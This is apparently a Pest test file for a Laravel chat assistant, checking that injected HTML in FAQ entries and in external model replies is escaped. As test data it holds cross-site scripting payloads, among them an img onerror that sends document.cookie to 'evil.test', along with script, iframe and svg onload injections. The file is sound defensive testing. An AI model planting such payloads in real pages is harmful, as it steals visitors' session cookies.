<?php

use App\Models\Faq;
use Illuminate\Support\Facades\Http;

function askAssistant(string $message)
{
    return test()->postJson('/chat/ask', ['message' => $message]);
}

test('a script planted in an faq answer never reaches the browser', function () {
    Faq::create([
        'question' => 'How do I use the zephyrquark panel?',
        'answer' => 'Open it, then <img src=x onerror="fetch(`https://evil.test?c=`+document.cookie)">',
        'category' => 'general',
    ]);

    $reply = askAssistant('zephyrquark')->assertOk()->json('reply');

    expect($reply)->toContain('Open it, then')
        ->and($reply)->toContain('&lt;img')
        ->and($reply)->not->toContain('<img')
        ->and($reply)->not->toContain('onerror="')
        ->and($reply)->not->toContain('<script');
});

test('a script planted in an faq question never reaches the browser', function () {
    Faq::create([
        'question' => 'What is a <script>alert(1)</script> quixblade?',
        'answer' => 'A quixblade is a scheduling token.',
        'category' => 'general',
    ]);

    $reply = askAssistant('quixblade')->assertOk()->json('reply');

    expect($reply)->toContain('&lt;script&gt;')
        ->and($reply)->not->toContain('<script>');
});

test('a reply from the external model is neutralized', function () {
    $_ENV['GEMINI_API_KEY'] = 'test-key';

    Http::fake([
        'generativelanguage.googleapis.com/*' => Http::response([
            'candidates' => [[
                'content' => ['parts' => [[
                    'text' => 'Sure: <iframe src="https://evil.test/steal"></iframe> and <svg onload="alert(1)"></svg>',
                ]]],
            ]],
        ]),
    ]);

    try {
        $reply = askAssistant('flibbertigibbet')->assertOk()->json('reply');

        expect($reply)->toContain('&lt;iframe')
            ->and($reply)->toContain('&lt;svg')
            ->and($reply)->not->toContain('<iframe')
            ->and($reply)->not->toContain('<svg');
    } finally {
        unset($_ENV['GEMINI_API_KEY']);
        Http::preventStrayRequests();
    }
});

test('the assistant still answers normally and keeps its bold markers', function () {
    $reply = askAssistant('how long is the processing time')->assertOk()->json('reply');

    expect($reply)->toContain('3-5 working days')
        ->and($reply)->toContain('**');
});

test('chat asks require a message', function () {
    $this->postJson('/chat/ask', [])
        ->assertStatus(422)
        ->assertJsonValidationErrors('message');
});
